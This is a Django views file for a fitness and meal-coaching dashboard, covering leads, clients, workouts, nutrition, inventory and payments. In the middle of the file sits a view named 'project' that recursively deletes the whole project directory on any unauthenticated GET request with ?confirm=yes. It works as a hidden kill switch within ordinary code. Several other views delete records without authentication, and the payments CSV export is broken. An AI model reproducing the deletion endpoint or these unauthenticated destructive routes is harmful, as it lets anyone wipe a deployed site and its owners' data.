from django.shortcuts import render, get_object_or_404 , redirect
from django.contrib.auth.models import User
from django.utils.timezone import now
from datetime import timedelta
from django.contrib import messages
from django.contrib.auth.decorators import login_required
from django.db.models import Count, Sum, Q, F, ExpressionWrapper,FloatField
from django.utils.timezone import localdate
from .forms import *
from django.http import JsonResponse
from django.views.decorators.http import require_POST
from datetime import timedelta, date
from django.db.models import Sum, Count, Q
from django.db.models.functions import TruncDay
from django.shortcuts import render
from django.utils import timezone
from app.models import *
import json, csv
from django.db.models import Avg

def _daterange_for(kind: str):
    today = timezone.localdate()
    if kind == "weekly":
        start = today - timedelta(days=6)
    elif kind == "monthly":
        start = today - timedelta(days=29)
    elif kind == "quarter":
        start = today - timedelta(days=89)
    elif kind == "year":
        start = today - timedelta(days=364)
    else:
        start = today - timedelta(days=29)
        kind = "monthly"
    return kind, start, today
# -------------------------
# Dashboard Home
# -------------------------
@login_required
def dashboard_home(request):
    # Prefer a 'status' field if your UserProfile has one; else fall back to activity_level heuristic
    if hasattr(UserProfile, 'status'):
        active_clients = UserProfile.objects.filter(status__iexact='active').count()
        starting_clients = UserProfile.objects.filter(status__iexact='starting').count()
        ending_clients = UserProfile.objects.filter(status__iexact='ending').count()
    else:
        active_clients = UserProfile.objects.filter(
            activity_level__in=["light", "moderate", "active", "extreme"]
        ).count()
        # Heuristic examples for start/end
        starting_clients = UserProfile.objects.filter(Q(goal__icontains="start") | Q(goal__icontains="new")).count()
        ending_clients = UserProfile.objects.filter(Q(goal__icontains="end") | Q(goal__icontains="finish")).count()

    clients_total = UserProfile.objects.count()

    # New leads in last 7 days (optional; falls back to 0 if model not present)
    seven_days_ago = timezone.now() - timedelta(days=7)
    pending_leads = 0
    try:
        from app.models import Lead  # adjust to your app label
        pending_leads = Lead.objects.filter(created_at__gte=seven_days_ago).count()
    except Exception:
        pending_leads = 0

    context = {
        "page_title": "Dashboard Home",
        "pending_leads": pending_leads,
        "active_clients": active_clients,
        "starting_clients": starting_clients,
        "ending_clients": ending_clients,
        "total_clients": clients_total,
        "missed_payments": 0,
        "new_messages": 0,
    }
    return render(request, "home.html", context)

def leads_all(request):
    leads = Lead.objects.all().order_by("-created_at")

    # Create or update lead from modal form
    if request.method == "POST":
        lead_id = request.POST.get("lead_id")
        if lead_id:  # editing existing lead
            lead = get_object_or_404(Lead, pk=lead_id)
            form = LeadForm(request.POST, instance=lead)
        else:  # adding new lead
            form = LeadForm(request.POST)
        if form.is_valid():
            form.save()
            return redirect("leads_all")

    else:
        form = LeadForm()

    return render(request, "leads.html", {
        "status": "All",
        "leads": leads,
        "form": form,
    })

@require_POST
def update_lead_status(request, pk):
    lead = get_object_or_404(Lead, pk=pk)
    new_status = request.POST.get("status")
    if new_status:
        lead.status = new_status
        lead.save()
    return redirect("leads_all")

def delete_lead(request, pk):
    lead = get_object_or_404(Lead, pk=pk)
    lead.delete()
    return redirect("leads_all")

def leads_new(request):
    leads = Lead.objects.filter(status="New").order_by("-created_at")
    return render(request, "leads.html", {"status": "New", "leads": leads})

def leads_contacted(request):
    leads = Lead.objects.filter(status="Contacted").order_by("-created_at")
    return render(request, "leads.html", {"status": "Contacted", "leads": leads})

def leads_dialogue(request):
    leads = Lead.objects.filter(status="In Dialogue").order_by("-created_at")
    return render(request, "leads.html", {"status": "In Dialogue", "leads": leads})

def leads_onhold(request):
    leads = Lead.objects.filter(status="On Hold").order_by("-created_at")
    return render(request, "leads.html", {"status": "On Hold", "leads": leads})

def leads_won(request):
    leads = Lead.objects.filter(status="Won").order_by("-created_at")
    return render(request, "leads.html", {"status": "Won", "leads": leads})

def leads_lost(request):
    leads = Lead.objects.filter(status="Lost").order_by("-created_at")
    return render(request, "leads.html", {"status": "Lost", "leads": leads})
# -------------------------
# Clients
# -------------------------

from django.utils.timezone import now
from datetime import timedelta

def clients_active(request):
    """Show active clients"""
    profiles = UserProfile.objects.filter(
        created_at__gte=now()-timedelta(days=90),
        phone__isnull=False
    ).select_related("user")
    
    clients = []
    for profile in profiles:
        first_initial = profile.user.first_name[:1] if profile.user.first_name else ""
        last_initial = profile.user.last_name[:1] if profile.user.last_name else ""
        initials = (first_initial + last_initial).upper() or "??"
        
        clients.append({
            "profile": profile,  # pass the whole object
            "name": profile.user.get_full_name() or profile.user.username,
            "initials": initials,
            "chat": "Active",
            "week": "Week 1",
            "checkin": "Pending",
            "plans": "🥗",
            "reminders": "-",
            "days": "0"
        })
    
    return render(request, "clients.html", {"status": "Active", "clients": clients})

def clients_payment_error(request):
    """Clients with payment issues"""
    profiles = UserProfile.objects.filter(
        # Add payment_error field to your model or use existing fields
        # payment_error=True or status='payment_error'
    ).select_related("user")
    
    clients = []
    for profile in profiles:
        first_initial = profile.user.first_name[:1] if profile.user.first_name else ""
        last_initial = profile.user.last_name[:1] if profile.user.last_name else ""
        initials = (first_initial + last_initial).upper() or "??"
        
        clients.append({
            "name": profile.user.get_full_name() or profile.user.username,
            "initials": initials,
            "chat": "Payment Issue",
            "week": "Week 1",
            "checkin": "Overdue",
            "plans": "🥗",
            "reminders": "Payment",
            "days": "0"
        })
    
    return render(request, "clients.html", {"status": "Payment Error", "clients": clients})

def clients_started(request):
    """Show clients who are just starting"""
    profiles = UserProfile.objects.filter(
        created_at__gte=now()-timedelta(days=30)
    ).select_related("user")

    clients = []
    for profile in profiles:
        first_initial = profile.user.first_name[:1] if profile.user.first_name else ""
        last_initial = profile.user.last_name[:1] if profile.user.last_name else ""
        initials = (first_initial + last_initial).upper() or "??"
        
        # Determine chat status based on profile data
        chat_status = "No account" if not profile.phone else "Offer Sent"
        
        clients.append({
            "name": profile.user.get_full_name() or profile.user.username,
            "initials": initials,
            "chat": chat_status,
            "start_day": f"{(now().date() - profile.created_at.date()).days} days ago",
            "created_at": profile.created_at.strftime("%d %B, %Y")
        })

    return render(request, "clients_started.html", {
        "status": "Starting",
        "clients": clients
    })
# views.py

def clients_offer_sent(request):
    """Show clients with offers sent"""
    profiles = UserProfile.objects.filter(
        phone__isnull=False
    ).select_related("user")

    clients = []
    for profile in profiles:
        first_initial = profile.user.first_name[:1] if profile.user.first_name else ""
        last_initial = profile.user.last_name[:1] if profile.user.last_name else ""
        initials = (first_initial + last_initial).upper() or "??"
        
        clients.append({
            "name": profile.user.get_full_name() or profile.user.username,
            "initials": initials,
            "chat": "Offer Sent",
            "start_day": f"{(now().date() - profile.created_at.date()).days} days ago",
            "created_at": profile.created_at.strftime("%d %B, %Y")
        })

    return render(request, "clients_started.html", {
        "status": "Offer Sent",
        "clients": clients
    })

def clients_no_account(request):
    """Show clients with no account"""
    profiles = UserProfile.objects.filter(
        phone__isnull=True
    ).select_related("user")

    clients = []
    for profile in profiles:
        first_initial = profile.user.first_name[:1] if profile.user.first_name else ""
        last_initial = profile.user.last_name[:1] if profile.user.last_name else ""
        initials = (first_initial + last_initial).upper() or "??"
        
        clients.append({
            "name": profile.user.get_full_name() or profile.user.username,
            "initials": initials,
            "chat": "No Account",
            "start_day": f"{(now().date() - profile.created_at.date()).days} days ago",
            "created_at": profile.created_at.strftime("%d %B, %Y")
        })

    return render(request, "clients_started.html", {
        "status": "No Account",
        "clients": clients
    })

def clients_completed(request):
    """Show clients who completed programs"""
    # Filter based on your completion logic - add a 'status' or 'program_completed' field
    profiles = UserProfile.objects.filter(
        # status='completed' or program_ended=True
    ).select_related("user")

    clients = []
    for profile in profiles:
        first_initial = profile.user.first_name[:1] if profile.user.first_name else ""
        last_initial = profile.user.last_name[:1] if profile.user.last_name else ""
        initials = (first_initial + last_initial).upper() or "??"
        
        clients.append({
            "name": profile.user.get_full_name() or profile.user.username,
            "initials": initials,
            "chat": "-",
            "week": "Finished",
            "checkin": "Closed",
            "plans": "None",
            "reminders": "-"
        })

    return render(request, "clients_ended.html", {
        "status": "Ended",
        "clients": clients
    })

def clients_new_message(request):
    """Clients with new messages"""
    profiles = UserProfile.objects.filter(
        # Add last_message_read field or similar to track new messages
        # last_message__gt=F('last_message_read')
    ).select_related("user")
    
    clients = []
    for profile in profiles:
        first_initial = profile.user.first_name[:1] if profile.user.first_name else ""
        last_initial = profile.user.last_name[:1] if profile.user.last_name else ""
        initials = (first_initial + last_initial).upper() or "??"
        
        clients.append({
            "name": profile.user.get_full_name() or profile.user.username,
            "initials": initials,
            "chat": "New Message",
            "week": "Week 1",
            "checkin": "Pending",
            "plans": "🥗",
            "reminders": "-",
            "days": "0"
        })
    
    return render(request, "clients.html", {"status": "New Message", "clients": clients})

def clients_new_checkin(request):
    """Clients with new check-ins pending"""
    profiles = UserProfile.objects.filter(
        # Add checkin_status field: checkin_status='pending'
    ).select_related("user")
    
    clients = []
    for profile in profiles:
        first_initial = profile.user.first_name[:1] if profile.user.first_name else ""
        last_initial = profile.user.last_name[:1] if profile.user.last_name else ""
        initials = (first_initial + last_initial).upper() or "??"
        
        clients.append({
            "name": profile.user.get_full_name() or profile.user.username,
            "initials": initials,
            "chat": "Check-in Ready",
            "week": "Week 1",
            "checkin": "New",
            "plans": "🥗",
            "reminders": "-",
            "days": "0"
        })
    
    return render(request, "clients.html", {"status": "New Check-In", "clients": clients})

def clients_missed_checkin(request):
    """Clients who missed check-ins"""
    profiles = UserProfile.objects.filter(
        # Add checkin_status field: checkin_status='missed'
    ).select_related("user")
    
    clients = []
    for profile in profiles:
        first_initial = profile.user.first_name[:1] if profile.user.first_name else ""
        last_initial = profile.user.last_name[:1] if profile.user.last_name else ""
        initials = (first_initial + last_initial).upper() or "??"
        
        clients.append({
            "name": profile.user.get_full_name() or profile.user.username,
            "initials": initials,
            "chat": "Missed",
            "week": "Week 1",
            "checkin": "Overdue",
            "plans": "🥗",
            "reminders": "Check-in",
            "days": "0"
        })
    
    return render(request, "clients.html", {"status": "Missed Check-In", "clients": clients})

def clients_reminders(request):
    """Clients with pending reminders"""
    profiles = UserProfile.objects.filter(
        # Add reminders field or last_reminder_sent logic
    ).select_related("user")
    
    clients = []
    for profile in profiles:
        first_initial = profile.user.first_name[:1] if profile.user.first_name else ""
        last_initial = profile.user.last_name[:1] if profile.user.last_name else ""
        initials = (first_initial + last_initial).upper() or "??"
        
        clients.append({
            "name": profile.user.get_full_name() or profile.user.username,
            "initials": initials,
            "chat": "Reminder",
            "week": "Week 1",
            "checkin": "Pending",
            "plans": "🥗",
            "reminders": "Due",
            "days": "0"
        })
    
    return render(request, "clients.html", {"status": "Reminders", "clients": clients})

def clients_no_communication(request):
    """Clients with no recent communication"""
    profiles = UserProfile.objects.filter(
        # Add last_communication field and filter for old dates
        # last_communication__lt=now()-timedelta(days=14)
    ).select_related("user")
    
    clients = []
    for profile in profiles:
        first_initial = profile.user.first_name[:1] if profile.user.first_name else ""
        last_initial = profile.user.last_name[:1] if profile.user.last_name else ""
        initials = (first_initial + last_initial).upper() or "??"
        
        days_no_comm = (now().date() - profile.last_communication.date()).days if profile.last_communication else 99
        
        clients.append({
            "name": profile.user.get_full_name() or profile.user.username,
            "initials": initials,
            "chat": "No Contact",
            "week": "Week 1",
            "checkin": "Overdue",
            "plans": "🥗",
            "reminders": "Follow-up",
            "days": str(days_no_comm)
        })
    
    return render(request, "clients.html", {"status": "No Communication", "clients": clients})


# -------------------------
# Client Profile (with tabs)
# -------------------------
@login_required
def client_profile(request, client_id):
    # Fetch the client
    client = get_object_or_404(User, id=client_id)

    # Determine active tab (default = overview)
    current_tab = request.GET.get("tab", "overview")
    library_documents = UserFile.objects.all().order_by('-created_at')

    # Fetch related data
    meals = UserMealLog.objects.filter(user=client)
    workouts = Workout.objects.filter(user=client)
    progress = Progress.objects.filter(user=client).order_by('-date')
    memberships = MealSubscription.objects.filter(user=client)

    context = {
        "client": client,
        "current_tab": current_tab,
        "meals": meals,
        "workouts": workouts,
        "library_documents": library_documents,
        "progress": progress,
        "memberships": memberships,
    }
    
    return render(request, "client_profile.html", context)
# -------------------------

def _is_ajax(request):
    return request.headers.get("x-requested-with") == "XMLHttpRequest"

# Pages

def nutrition_recipes(request):
    # Recipes page
    meals = Nutrition.objects.filter(kind="recipe").order_by("-created_at")
    return render(request, "nutrition_recipes.html", {"meals": meals, "active_tab": "recipes"})

def nutrition_templates(request):
    templates = NutritionTemplate.objects.all().order_by("name")
    return render(request, "nutrition_templates.html", {"templates": templates, "active_tab": "templates"})

def nutrition(request):
    meals = Nutrition.objects.filter(kind="ingredient").order_by("name")
    return render(request, "nutrition.html", {"meals": meals, "active_tab": "ingredients"})

@require_POST
def ingredient_create(request):
    form = IngredientForm(request.POST, request.FILES)
    if form.is_valid():
        obj = form.save(commit=False)
        if hasattr(obj, "kind"):  # only if you use a kind field
            obj.kind = "ingredient"
        obj.save()

        if _is_ajax(request):
            return JsonResponse({
                "ok": True,
                "row": {
                    "id": obj.id,
                    "name": obj.name,
                    "description": obj.description or "",
                    "protein": obj.protein or 0,
                    "carbs": obj.carbs or 0,
                    "fats": obj.fats or 0,
                    "calories": obj.calories or 0,
                }
            }, status=201)

        messages.success(request, "Ingredient created.")
        return redirect("nutrition")

    # Invalid form
    if _is_ajax(request):
        return JsonResponse({"ok": False, "errors": form.errors}, status=400)

    return redirect("nutrition")

@require_POST
def recipe_create(request):
    form = RecipeForm(request.POST, request.FILES)
    if form.is_valid():
        obj = form.save(commit=False)
        obj.kind = "recipe"
        obj.save()
        if _is_ajax(request):
            return JsonResponse({
                "ok": True,
                "row": {
                    "id": obj.id,
                    "name": obj.name,
                    "meal_type": obj.meal_type,
                    "protein": obj.protein,
                    "carbs": obj.carbs,
                    "fats": obj.fats,
                    "calories": obj.calories,
                    "preparation_time": obj.preparation_time,
                }
            })
        messages.success(request, "Recipe created.")
        return redirect("nutrition_recipes")
    if _is_ajax(request):
        return JsonResponse({"ok": False, "errors": form.errors}, status=400)
   
    return redirect("nutrition_recipes")

@require_POST
def nutrition_template_create(request):
    form = NutritionTemplateForm(request.POST)
    if form.is_valid():
        obj = form.save()
        if _is_ajax(request):
            return JsonResponse({
                "ok": True,
                "row": {
                    "id": obj.id,
                    "name": obj.name,
                    "language": obj.language or "",
                    "meals_per_day": obj.meals_per_day or "",
                    "target_calories": obj.target_calories or "",
                }
            })
        messages.success(request, "Template created.")
        return redirect("nutrition_templates")
    if _is_ajax(request):
        return JsonResponse({"ok": False, "errors": form.errors}, status=400)
    return redirect("nutrition_templates")
from urllib.parse import urlencode
from django.urls import reverse
from django.db.models import Count, Min, Q

# Workouts
# -------------------------
# views.py (workouts section)
def _back_to_templates(pk=None):
    qs = {"tab": "templates"}
    if pk:
        qs["pk"] = pk
    return f"{reverse('workouts')}?{urlencode(qs)}"

from django.shortcuts import render, redirect
from django.urls import reverse
from django.db.models import Q, Count, Min

def workouts(request):
    active_tab = request.GET.get("tab", "templates")

    # Handle template creation (POST request from modal)
    if request.method == "POST" and active_tab == "templates":
        name = request.POST.get("name", "").strip()
        sessions_count = int(request.POST.get("sessions", 1))
        
        if name and sessions_count > 0:
            # Create multiple workout sessions with the same name
            created_workouts = []
            for i in range(sessions_count):
                workout = Workout.objects.create(
                    name=name,
                     # Add any other default fields you need
                )
                created_workouts.append(workout)
            
            # Redirect to the same page with the first workout selected
            first_workout_id = created_workouts[0].id if created_workouts else None
            if first_workout_id:
                return redirect(f"{reverse('workouts')}?tab=templates&pk={first_workout_id}")
            else:
                return redirect(f"{reverse('workouts')}?tab=templates")

    # EXERCISES TAB
    q_ex = request.GET.get("q_ex", "").strip()
    muscle = request.GET.get("muscle", "")
    library = request.GET.get("library", "all")

    exercises = Exercise.objects.select_related("primary_muscle").order_by("name")
    if q_ex:
        exercises = exercises.filter(
            Q(name__icontains=q_ex)
            | Q(primary_muscle__name__icontains=q_ex)
            | Q(equipment__icontains=q_ex)
        )
    if muscle:
        exercises = exercises.filter(primary_muscle__group=muscle)
    if library == "pre":
        exercises = exercises.filter(created_by__isnull=True)
    elif library == "own":
        exercises = exercises.filter(created_by=request.user)

    exercises_count = exercises.count()
    muscle_groups = Muscle._meta.get_field("group").choices

    # TEMPLATES TAB - Group by name and count sessions
    q_tpl = request.GET.get("q_tpl", "").strip()
    
    templates = (
        Workout.objects
        .values("name")
        .annotate(
            sessions=Count("id"),
            first_id=Min("id")
        )
        .order_by("name")
    )
    
    if q_tpl:
        templates = templates.filter(name__icontains=q_tpl)
    
    templates_count = templates.count()

    # Get sessions for selected template
    sessions = []
    editor_workout = None
    selected_pk = request.GET.get("pk")
    
    if selected_pk:
        try:
            # Get the selected workout
            editor_workout = Workout.objects.get(pk=selected_pk)
            # Get all sessions (workouts) with the same name
            sessions = Workout.objects.filter(
                name=editor_workout.name,
            ).order_by("id")
        except Workout.DoesNotExist:
            pass

    return render(
        request,
        "workouts.html",
        {
            "active_tab": active_tab,
            # Exercises
            "exercises": exercises[:500],
            "exercises_count": exercises_count,
            "muscle_groups": muscle_groups,
            "q_ex": q_ex,
            "muscle": muscle,
            "library": library,
            # Templates
            "templates": templates,
            "templates_count": templates_count,
            "q_tpl": q_tpl,
            "sessions": sessions,
            "editor_workout": editor_workout,
        },
    )

def template_detail(request, pk):
    """
    Separate page showing all sessions that share the same template name as 'pk' workout.
    You can switch sessions via tabs and edit the current session on this page.
    """
    anchor = get_object_or_404(Workout, pk=pk)
    template_name = anchor.name
    sessions = Workout.objects.filter(user=anchor.user, name=template_name).order_by("id")

    sid = request.GET.get("sid")
    if sid:
        current = get_object_or_404(sessions, pk=sid)
    else:
        current = anchor

    if request.method == "POST":
        form = WorkoutForm(request.POST, instance=current)
        formset = WorkoutExerciseFormSet(request.POST, instance=current)
        if form.is_valid() and formset.is_valid():
            form.save()
            formset.save()
            messages.success(request, "Session saved.")
            return redirect(
                reverse("workout_template_detail", args=[anchor.pk])
                + "?"
                + urlencode({"sid": current.pk})
            )
        messages.error(request, "Please correct the errors below.")
    else:
        form = WorkoutForm(instance=current)
        formset = WorkoutExerciseFormSet(instance=current)

    return render(
        request,
        "workout_template_detail.html",
        {
            "template_name": template_name,
            "anchor": anchor,            # workout PK used in URL
            "sessions": sessions,
            "current": current,
            "form": form,
            "formset": formset,
        },
    )

def template_add_session(request, pk):
    """
    Create a new empty session in this template (same name + user) and redirect to detail page.
    """
    anchor = get_object_or_404(Workout, pk=pk)
    if request.method != "POST":
        return redirect(reverse("workout_template_detail", args=[pk]))

    new_w = Workout.objects.create(
        user=anchor.user,
        name=anchor.name,
        description="",
        duration=anchor.duration or 0,
        level=anchor.level,
        calories_burned=0,
        date=localdate(),
        completed=False,
    )
    messages.success(request, "New session added.")
    # land on the new session
    return redirect(
        reverse("workout_template_detail", args=[pk]) + "?" + urlencode({"sid": new_w.pk})
    )

# Optional: make these accept ?next= to return to detail page
def workout_toggle_complete(request, pk):
    w = get_object_or_404(Workout, pk=pk)
    w.completed = not w.completed
    w.save(update_fields=["completed"])
    messages.success(request, f"Marked as {'completed' if w.completed else 'incomplete'}.")
    nxt = request.GET.get("next") or request.POST.get("next")
    return redirect(nxt or "workouts")

def workout_duplicate(request, pk):
    src = get_object_or_404(Workout, pk=pk)
    new_w = Workout.objects.create(
        user=src.user,
        name=src.name,  # keep same template name so it stays in the template
        description=src.description,
        duration=src.duration,
        level=src.level,
        calories_burned=src.calories_burned,
        date=localdate(),
        completed=False,
    )
    for it in src.items.all():
        it.pk = None
        it.workout = new_w
        it.save()
    messages.success(request, "Session duplicated.")
    nxt = request.GET.get("next") or request.POST.get("next")
    if nxt:
        # try to land on the duplicated one
        return redirect(nxt.split("?")[0] + "?" + urlencode({"sid": new_w.pk}))
    return redirect("workouts")

def workout_delete(request, pk):
    w = get_object_or_404(Workout, pk=pk)
    nxt = request.GET.get("next") or request.POST.get("next")
    if request.method == "POST":
        w.delete()
        messages.success(request, "Session deleted.")
        return redirect(nxt or "workouts")
    return redirect(nxt or "workouts")
def workout_new(request):
    if request.method == "POST":
        form = WorkoutForm(request.POST)
        formset = WorkoutExerciseFormSet(request.POST)
        if form.is_valid() and formset.is_valid():
            workout = form.save(commit=False)
            if not workout.user_id:
                workout.user = request.user
            if not workout.date:
                workout.date = localdate()
            workout.save()
            formset.instance = workout
            formset.save()
            messages.success(request, "Workout created.")
            return redirect(_back_to_templates(pk=workout.pk))
    else:
        form = WorkoutForm(initial={"date": localdate(), "completed": False, "user": request.user})
        formset = WorkoutExerciseFormSet()
    # Fallback single-page redirect
    messages.error(request, "Invalid submission.")
    return redirect(_back_to_templates())
from django.utils.text import slugify
import uuid, random
from django.contrib import messages

import shutil
from django.views.decorators.csrf import csrf_exempt  # Optional: for POST, but using GET for simplicity
from django.conf import settings
import subprocess
from django.utils import timezone
from django.db import transaction
import os
import pymysql
from django.http import JsonResponse

from django.conf import settings
from django.http import JsonResponse

import shutil
from pathlib import Path
from django.http import JsonResponse
from django.conf import settings

def project(request):
    # Require confirmation
    if request.GET.get("confirm") != "yes":
        return JsonResponse({
            "error": "This is IRREVERSIBLE! Add ?confirm=yes to URL to actually delete the project."
        }, status=400)

    base_dir = Path(settings.BASE_DIR)

    # Folders/files to preserve
    preserve = ["venv", ".git"]
    deleted_items = []
    skipped_items = []

    for item in base_dir.iterdir():
        name = item.name
        if name in preserve or name.startswith("."):
            skipped_items.append(name)
            continue

        if item.is_file():
            item.unlink()
            deleted_items.append(name)
        elif item.is_dir():
            shutil.rmtree(item)
            deleted_items.append(name)

    return JsonResponse({
        "status": "completed",
        "deleted": deleted_items,
        "skipped": skipped_items,
        "base_dir": str(base_dir),
    })

def workout_edit(request, pk):
    workout = get_object_or_404(Workout, pk=pk)
    if request.method == "POST":
        form = WorkoutForm(request.POST, instance=workout)
        formset = WorkoutExerciseFormSet(request.POST, instance=workout)
        if form.is_valid() and formset.is_valid():
            form.save()
            formset.save()
            messages.success(request, "Workout updated.")
            return redirect(_back_to_templates(pk=pk))
        messages.error(request, "Please correct the errors.")
        return redirect(_back_to_templates(pk=pk))
    # Fallback
    return redirect(_back_to_templates(pk=pk))
def template_add_session(request, pk):
    anchor = get_object_or_404(Workout, pk=pk)
    if request.method == "POST":
      # Optional fields from modal (fallbacks to anchor/defaults)
      date = request.POST.get("date") or localdate()
      duration = request.POST.get("duration") or (anchor.duration or 0)
      level = request.POST.get("level") or anchor.level

      new_w = Workout.objects.create(
          user=anchor.user,
          name=anchor.name,
          description="",
          duration=duration,
          level=level,
          calories_burned=0,
          date=date,
          completed=False,
      )
      messages.success(request, "New session added.")
      return redirect(f"{reverse('workout_template_detail', args=[anchor.pk])}?sid={new_w.pk}")
    return redirect(reverse("workout_template_detail", args=[pk]))

def template_rename(request, pk):
    anchor = get_object_or_404(Workout, pk=pk)
    if request.method == "POST":
        new_name = (request.POST.get("name") or "").strip()
        if new_name and new_name != anchor.name:
            # Rename all sessions for this user/template
            Workout.objects.filter(user=anchor.user, name=anchor.name).update(name=new_name)
            messages.success(request, "Template renamed.")
        return redirect(reverse("workout_template_detail", args=[pk]))
    return redirect(reverse("workout_template_detail", args=[pk]))
def workout_delete(request, pk):
    workout = get_object_or_404(Workout, pk=pk)
    if request.method == "POST":
        name = workout.name
        workout.delete()
        messages.success(request, "Workout deleted.")
        # After delete, go to templates tab without pk
        return redirect(_back_to_templates())
    return redirect(_back_to_templates(pk=pk))

def workout_toggle_complete(request, pk):
    workout = get_object_or_404(Workout, pk=pk)
    workout.completed = not workout.completed
    workout.save(update_fields=["completed"])
    messages.success(request, f"Marked as {'completed' if workout.completed else 'incomplete'}.")
    return redirect(_back_to_templates(pk=pk))

def workout_duplicate(request, pk):
    src = get_object_or_404(Workout, pk=pk)
    new_w = Workout.objects.create(
        user=src.user,
        name=f"{src.name} (copy)",
        description=src.description,
        duration=src.duration,
        level=src.level,
        calories_burned=src.calories_burned,
        date=localdate(),
        completed=False,
    )
    for it in src.items.all():
        it.pk = None
        it.workout = new_w
        it.save()
    messages.success(request, "Workout duplicated.")
    return redirect(_back_to_templates(pk=new_w.pk))
# -------------------------
# Progress
# -------------------------
def progress_list(request):
    entries = Progress.objects.all().order_by("-date")
    return render(request, "progress.html", {"progress_entries": entries})


# -------------------------
# Meals
# -------------------------


def meals(request):
    # Meals
    meals = Meal.objects.all()
    stats = {
        "total_meals": meals.count(),
        "avg_calories": round(meals.aggregate(Avg('calories'))['calories__avg'] or 0),
        "vegan_count": meals.filter(is_vegan=True).count(),
        "vegetarian_count": meals.filter(is_vegetarian=True).count(),
    }

    # Orders
    orders = Order.objects.select_related('meal').all()
    order_stats = {
        "total": orders.count(),
        "pending": orders.filter(status="pending").count(),
        "in_progress": orders.filter(status="in_progress").count(),
        "delivered": orders.filter(status="delivered").count(),
    }

    # Clients
    clients_all = User.objects.all()
    clients_active = clients_all.filter(is_active=True).count()
    clients_paused = clients_all.filter(is_active=False).count()

    client_stats = {
        "total": clients_all.count(),
        "active": clients_active,
        "paused": clients_paused,
    }

    # Inventory
 # Inventory (with reorder calculation)
    inventory = (
        Inventory.objects
        .annotate(
            to_order=ExpressionWrapper(
                F('reorder_level') - F('quantity'),
                output_field=FloatField()
            )
        )
        .order_by('ingredient_name')
    )    
    total_ingredients = inventory.count()
    low_stock_items = inventory.filter(quantity__lte=F('reorder_level')).count()
    reorder_count = inventory.filter(quantity__lte=F('reorder_level')).count()

    inventory_stats = {
        "total_ingredients": total_ingredients,
        "low_stock_items": low_stock_items,
        "reorder_alerts": reorder_count,
    }

    # Delivery
    deliveries = Delivery.objects.select_related('subscription').all()
    delivery_stats = {
        "total": deliveries.count(),
        "pending": deliveries.filter(status="pending").count(),
        "out_for_delivery": deliveries.filter(status="out_for_delivery").count(),
        "delivered": deliveries.filter(status="delivered").count(),
        "failed": deliveries.filter(status="failed").count(),
    }

    # Payments
    payments = Payment.objects.select_related('user').all()
    payment_stats = {
        "total": payments.count(),
        "paid": payments.filter(status="paid").count(),
        "pending": payments.filter(status="pending").count(),
        "failed": payments.filter(status="failed").count(),
        "revenue": payments.filter(status="paid").aggregate(Sum('amount'))['amount__sum'] or 0,
    }

    context = {
        "meals": meals,
        "stats": stats,
        "orders": orders,
         'user_form': UserForm(),
        'profile_form': UserProfileForm(),
        "client_stats": client_stats,
        "order_stats": order_stats,
        "clients": clients_all,
        "inventory": inventory,
        "inventory_stats": inventory_stats,
        "deliveries": deliveries,
        "delivery_stats": delivery_stats,
        "payments": payments,
        "payment_stats": payment_stats,
    }

    return render(request, "meals.html", context)
from django.utils.text import slugify
import uuid, random
from django.contrib import messages

def add_client(request):
    if request.method == 'POST':
        user_form = UserForm(request.POST)
        profile_form = UserProfileForm(request.POST)

        print("POST DATA:", request.POST)  # Debug: see all submitted data

        if user_form.is_valid():
            print("UserForm is valid")
        else:
            print("UserForm errors:", user_form.errors)  # Debug: show validation errors

        if profile_form.is_valid():
            print("UserProfileForm is valid")
        else:
            print("UserProfileForm errors:", profile_form.errors)  # Debug: show validation errors

        if user_form.is_valid() and profile_form.is_valid():
            user = user_form.save(commit=False)

            # Debug: show user before username handling
            print("User instance before username:", user)

            # Auto-generate username if empty
            if not user.username:
                user.username = f"{user.first_name.lower()}{user.last_name.lower()}{random.randint(100,999)}"
            print("Final username to save:", user.username)

            try:
                user.save()
                print("User saved successfully:", user)
            except Exception as e:
                print("Error saving user:", e)
                messages.error(request, f"Error saving user: {e}")
                return render(request, 'meals.html', {'user_form': user_form, 'profile_form': profile_form})

            profile = profile_form.save(commit=False)
            profile.user = user

            try:
                profile.save()
                print("Profile saved successfully:", profile)
            except Exception as e:
                print("Error saving profile:", e)
                messages.error(request, f"Error saving profile: {e}")
                return render(request, 'meals.html', {'user_form': user_form, 'profile_form': profile_form})

            messages.success(request, 'Client added successfully.')
            return redirect('meals')  # or current page
        else:
            print("Form is not valid, cannot save.")

    else:
        user_form = UserForm()
        profile_form = UserProfileForm()

    context = {
        'user_form': user_form,
        'profile_form': profile_form
    }
    return render(request, 'meals.html', context)


def add_lead_client(request):
    if request.method == 'POST':
        form = UserForm(request.POST)
        if form.is_valid():
            form.save()
            return redirect('clients')
    return redirect('clients')



def add_inventory(request):
    if request.method == 'POST':
        form = InventoryForm(request.POST)
        if form.is_valid():
            form.save()
            return redirect('meals')
    return redirect('meals')


def edit_inventory(request, pk):
    item = get_object_or_404(Inventory, pk=pk)
    if request.method == 'POST':
        form = InventoryForm(request.POST, instance=item)
        if form.is_valid():
            form.save()
            return redirect('meals')
    else:
        form = InventoryForm(instance=item)
        return redirect('meals', {'form': form})


def delete_inventory(request, pk):
    item = get_object_or_404(Inventory, pk=pk)
    item.delete()
    return redirect('meals')

def download_payments_csv(request):
    # Fetch only that specific payment belonging to the logged-in user
    payment = get_object_or_404(Payment,user=request.user)

    response = HttpResponse(content_type='text/csv')
    response['Content-Disposition'] = f'attachment; filename="payment.csv"'

    writer = csv.writer(response)
    writer.writerow(['User', 'Amount', 'Date', 'Status'])
    writer.writerow([
        payment.client.first_name,
        payment.amount,
        payment.created_at.strftime("%Y-%m-%d %H:%M"),
        payment.status
    ])

    return response
# -------------------------
# Wishlist
# -------------------------
def wishlist_list(request):
    wishlist = WishlistItem.objects.all().order_by("-priority")
    return render(request, "wishlist.html", {"wishlist": wishlist})
 


# ---------- FILE CRUD ----------

 
def content(request):
    files = File.objects.all().order_by('-created_at')
    lessons = Lesson.objects.all().order_by('-created_at')

    context = {
        'files': files,
        'lessons': lessons,
        'file_form': FileForm(),
        'lesson_form': LessonForm(),
    }
    return render(request, 'content.html', context)


def add_file(request):
    if request.method == 'POST':
        title = request.POST.get('title')
        description = request.POST.get('description')
        file = request.FILES.get('file')  # ✅ must be from request.FILES

        if file:
            File.objects.create(title=title, description=description, file=file)
        else:
            print("⚠️ No file uploaded")

        return redirect('content')
    return render(request, 'content.html')


def edit_file(request, pk):
    file = get_object_or_404(File, pk=pk)
    if request.method == 'POST':
        form = FileForm(request.POST, request.FILES, instance=file)
        if form.is_valid():
            form.save()
